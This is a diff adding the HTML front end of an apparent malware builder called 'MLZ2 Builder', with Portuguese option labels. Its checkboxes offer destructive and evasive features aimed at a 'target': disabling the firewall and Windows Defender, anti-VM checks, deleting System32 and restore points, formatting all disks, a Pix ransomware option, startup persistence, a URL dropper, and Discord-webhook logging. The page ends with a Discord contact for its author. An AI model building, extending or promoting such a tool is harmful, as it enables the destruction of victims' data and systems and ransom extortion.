@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MLZ2 Builder</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="stylesheet" href="/static/custom-style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="/conf/particles-config.js"></script>
+    <link rel="stylesheet" href="/buton/button.css">
+    <script src="/buton/button.js"></script>
+    <link rel="stylesheet" href="/lateral/lateral.css">
+    <script src="/lateral/lateral.js" defer></script>
+
+</head>
+
+    <div id="particles-js"></div>
+    <div class="container">
+        <h1>MLZ2 Builder</h1>
+        <form id="buildForm">
+            <ul>
+                <li class="category">
+                    <h2><i class="fas fa-cogs"></i> Sistema</h2>
+                    <ul>
+                        <li>
+                            <input type="checkbox" id="firewallCheckbox">
+                            <label for="firewallCheckbox"><i class="fas fa-shield-alt"></i> Firewall</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="antivirusCheckbox">
+                            <label for="antivirusCheckbox"><i class="fas fa-shield-virus"></i> Windows Defender</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="antiVMCheckbox">
+                            <label for="antiVMCheckbox"><i class="fas fa-desktop"></i> Anti VM</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="deletesys32Checkbox">
+                            <label for="deletesys32Checkbox"><i class="fas fa-trash-alt"></i> Deleta o system32 do alvo</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="antipointCheckbox">
+                            <label for="antipointCheckbox"><i class="fas fa-undo"></i> Exclui os pontos de restauração do alvo</label>
+                        </li>
+                    </ul>
+                </li>
+            
+                <li class="category">
+                    <h2><i class="fas fa-wrench"></i> Configurações</h2>
+                    <ul>
+                        <li>
+                            <input type="checkbox" id="notificacaoCheckbox">
+                            <label for="notificacaoCheckbox"><i class="fas fa-bell"></i> Notificação</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="startupCheckbox">
+                            <label for="startupCheckbox"><i class="fas fa-cogs"></i> Startup</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="pythoninsCheckbox">
+                            <label for="pythoninsCheckbox"><i class="fab fa-python"></i> Instala o python na alvo</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="atualizacaoCheckbox">
+                            <label for="atualizacaoCheckbox"><i class="fab fa-windows"></i> Atualizações do windows</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="tecladooffCheckbox">
+                            <label for="tecladooffCheckbox"><i class="fas fa-keyboard"></i> Desativa o teclado do alvo</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="telapretaCheckbox">
+                            <label for="telapretaCheckbox"><i class="fas fa-desktop"></i> Tela preta no alvo</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="formatdiscoCheckbox">
+                            <label for="formatdiscoCheckbox"><i class="fas fa-hdd"></i> Formata todos os discos</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="tempoCheckbox">
+                            <label for="tempoCheckbox"><i class="far fa-clock"></i> Coloca uma data e hora aleatória</label>
+                        </li>
+                    </ul>
+                </li>
+            
+                <li class="category">
+                    <h2><i class="fas fa-gamepad"></i> Controle</h2>
+                    <ul>
+                        <li>
+                            <input type="checkbox" id="desligarCheckbox">
+                            <label for="desligarCheckbox"><i class="fas fa-power-off"></i> Desliga a máquina quando executado</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="reiniciarCheckbox">
+                            <label for="reiniciarCheckbox"><i class="fas fa-sync-alt"></i> Reinicia a máquina</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="processpamCheckbox">
+                            <label for="processpamCheckbox"><i class="fas fa-cogs"></i> Abre vários processos</label>
+                        </li>
+                    </ul>
+                </li>
+            
+                <li class="category">
+                    <h2><i class="fas fa-trash-alt"></i> Desinstalação</h2>
+                    <ul>
+                        <li>
+                            <input type="checkbox" id="dellprogramCheckbox">
+                            <label for="dellprogramCheckbox"><i class="fas fa-minus-circle"></i> Desinstala todos os programas</label>
+                        </li>
+                    </ul>
+                </li>
+            
+                <li class="category">
+                    <h2><i class="fas fa-paint-brush"></i> Personalização</h2>
+                    <ul>
+                        <li>
+                            <input type="checkbox" id="inativeatalhosCheckbox">
+                            <label for="inativeatalhosCheckbox"><i class="fas fa-mouse-pointer"></i> Desliga atalhos</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="trojanCheckbox">
+                            <label for="trojanCheckbox"><i class="fas fa-lock"></i> Ramsoware Du Pix</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="mataratoCheckbox">
+                            <label for="mataratoCheckbox"><i class="fas fa-mouse"></i> Desativa o mouse</label>
+                        </li>
+                        <li>
+                            <input type="checkbox" id="DropCheckbox" onchange="toggleOptions('DropCheckbox', 'Drop', 'Options')">
+                            <label for="DropCheckbox">
+                                <i class="far fa-file-archive"></i> Instala automaticamente
+                            </label>
+                            <input type="text" id="Drop" placeholder="URL Download automático" style="display: none;">
+                            <div id="Options" style="display: none;">
+                                <div class="option">
+                                    <input type="checkbox" id="admCheckbox">
+                                    <label for="admCheckbox">
+                                        <i class="fas fa-user-shield"></i> adm
+                                    </label>
+                                </div>
+                                <div class="option">
+                                    <input type="checkbox" id="automaticCheckbox">
+                                    <label for="automaticCheckbox">
+                                        <i class="fas fa-cogs"></i> automatico
+                                    </label>
+                                    
+                                    <li>
+                                        <input type="checkbox" id="logsCheckbox" onchange="toggleWebhookInput()">
+                                        <label for="logsCheckbox">
+                                            <i class="fas fa-book"></i> Logs (Discord Webhook)
+                                        </label>
+                                        <div id="webhookInput" style="display: none;">
+                                            <input type="text" id="webhookUrl" placeholder="Digite o Webhook do Discord">
+                                        </div>
+                                    </li>
+                                    <li class="category">
+                                        <h2><i class="fas fa-id-card"></i> Contato</h2>
+                                        <ul>
+                                            <li>
+                                                <h3><i class="fab fa-discord"></i> Discord: lalaio1</h3>
+                                            </li>
+                                        </ul>
+                                    </li>
+
+                                </ul>
+                            </li>
+                        </ul>
+                        <button type="button" onclick="build()">Build</button>
+                    </form>
+                </div>
+     
+    <script src="/static/script.js"></script>
+    <script src="/static/functionbuilder.js"></script>
+
+</body>
+</html>
